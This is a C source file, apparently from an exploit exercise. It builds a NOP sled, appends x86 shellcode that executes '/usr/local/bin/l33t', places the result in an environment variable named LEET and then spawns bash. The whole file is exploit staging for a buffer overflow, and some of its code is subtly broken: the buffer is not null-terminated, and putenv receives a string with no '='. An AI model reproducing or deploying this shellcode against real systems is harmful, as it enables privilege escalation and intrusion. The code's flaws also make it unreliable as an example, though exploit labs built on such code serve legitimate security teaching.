#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

#define BUFFER_SIZE 512
#define NOP_BYTE 0x90

// Shellcode to execute "/usr/local/bin/l33t"
char shellcode[] =
  "\xeb\x15\x5b\x31\xc0\x88\x43\x13\x89\x5b\x14\x89\x43\x18\x8d\x4b\x14\x89\xc2\xb0\x0b\xcd\x80\xe8\xe6\xff\xff\xff/usr/local/bin/l33t";

int main(void) {
    char buffer[BUFFER_SIZE];
    int shellcode_length = strlen(shellcode);

    // Fill the buffer with NOP instructions
    memset(buffer, NOP_BYTE, BUFFER_SIZE);

    // Place the shellcode at the end of the buffer
    memcpy(&buffer[BUFFER_SIZE - shellcode_length], shellcode, shellcode_length);

    // Set the LEET environment variable with the buffer
    setenv("LEET", buffer, 1);
    putenv(buffer);

    // Print a confirmation message
    printf("Loaded l33t shellcode into environment variable 'LEET'\n");

    // Launch a shell
    system("bash");

    return 0;
}
